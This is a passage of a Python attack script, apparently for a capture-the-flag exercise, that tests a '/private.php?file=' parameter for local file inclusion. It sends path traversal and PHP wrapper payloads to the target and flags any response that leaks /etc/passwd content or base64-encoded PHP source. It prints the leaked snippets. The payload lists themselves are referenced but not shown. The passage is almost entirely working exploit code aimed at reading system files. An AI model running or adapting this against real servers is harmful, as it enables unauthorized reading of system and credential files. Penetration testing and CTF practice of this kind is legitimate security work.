print("PHASE 2: LFI PAYLOAD TESTING on /private.php?file=XXX")
print("="*80)

endpoint = "/private.php"
base_url = f"{TARGET}{endpoint}"

# Get baseline
baseline = requests.get(base_url, timeout=10)
print(f"\n[BASELINE] GET {endpoint}")
print(f"  Status: {baseline.status_code}, Length: {len(baseline.text)}")

print("\n[+] Testing path traversal payloads...")
for payload, desc in LFI_PAYLOADS:
    url = f"{base_url}?file={urllib.parse.quote(payload, safe='')}" if ' ' in payload or '%' not in payload else f"{base_url}?file={payload}"
    
    try:
        resp = requests.get(url, timeout=10)
        # Check for success indicators
        success = False
        indicators = []
        
        if "root:" in resp.text:
            indicators.append("ETC_PASSWD_CONTENT")
            success = True
        if "passwd" in resp.text.lower() and len(resp.text) > len(baseline.text) + 50:
            indicators.append("PASSWD_MENTION")
        if len(resp.text) > len(baseline.text) + 200:
            indicators.append("LARGE_RESPONSE")
        if resp.status_code != baseline.status_code:
            indicators.append(f"STATUS_CHANGE({resp.status_code})")
        
        if success or len(indicators) > 0:
            print(f"\n  [!] {desc}")
            print(f"      Payload: {payload}")
            print(f"      Status: {resp.status_code}, Length: {len(resp.text)}")
            print(f"      Indicators: {indicators}")
            if success:
                print(f"      RESPONSE SNIPPET: {resp.text[:500]}")
    except Exception as e:
        print(f"  [ERROR] {desc}: {e}")

print("\n[+] Testing PHP wrapper payloads...")
for payload, desc in PHP_WRAPPERS:
    url = f"{base_url}?file={urllib.parse.quote(payload, safe='')}" if ' ' in payload else f"{base_url}?file={payload}"
    
    try:
        resp = requests.get(url, timeout=10)
        success = False
        indicators = []
        
        # Check for base64 content
        try:
            decoded = base64.b64decode(resp.text.strip())
            if b"<?php" in decoded or b"FLAG" in decoded:
                indicators.append("BASE64_PHP_CONTENT")
                success = True
        except:
            pass
        
        if "base64" in resp.text.lower() or len(resp.text) > len(baseline.text) + 100:
            indicators.append("ENCODED_CONTENT")
        if resp.status_code != baseline.status_code:
            indicators.append(f"STATUS_CHANGE({resp.status_code})")
        
        if success or len(indicators) > 0:
            print(f"\n  [!] {desc}")
            print(f"      Payload: {payload}")
            print(f"      Status: {resp.status_code}, Length: {len(resp.text)}")
            print(f"      Indicators: {indicators}")
            if success:
                print(f"      RESPONSE: {resp.text[:800]}")
    except Exception as e:
        print(f"  [ERROR] {desc}: {e}")
